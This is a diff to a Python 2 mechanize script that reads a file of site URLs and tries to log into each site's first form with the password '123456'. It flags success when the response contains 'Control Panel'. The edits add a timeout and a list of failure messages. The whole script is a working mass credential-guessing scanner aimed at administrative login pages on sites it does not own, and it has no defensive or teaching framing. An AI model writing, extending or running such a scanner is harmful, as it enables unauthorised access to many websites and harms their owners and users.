@@ -1,5 +1,5 @@
 #!/usr/bin/python
-
+import time
 from bs4 import BeautifulSoup
 import urllib
 import mechanize
@@ -10,22 +10,25 @@ import os
 #
 # print page.code
 
-error = "Usernames and password do not match or you do not have an"
+error = ["Username and password do not match or you do not have an account yet." , "LADP"]
 sussuc = "Control Panel"
 br = mechanize.Browser()
 br.set_handle_robots(False)
-fopen = open("/root/PycharmProjects/untitled/project/sites.txt", "r")
+fopen = open("/root/t/python/scanner_project/scanner/t.txt", "r")
 
 for line in fopen.readlines():
     print line.strip()
 
     try:
-        page = br.open(str(line))
-    except:
-        print "url can not be opened"
+        page = br.open(line, timeout=5)
+        print "no error"
+        print page.code
 
+    except:
+        # print page.code
+        pass
     try:
-        for  form in br.forms():
+        for form in br.forms():
 
 
             br.select_form(nr=0)
@@ -33,9 +36,10 @@ for line in fopen.readlines():
             br.form["passwd"] = "123456"
             br.submit()
             readingPage = br.response().read()
-            if error in readingPage:
-                print "wrong credential"
-            elif sussuc in readingPage:
+            for n in error:
+                if n in readingPage:
+                    print "wrong credential"
+            if sussuc in readingPage:
                 print "succeffuly loged in"
 
     except:
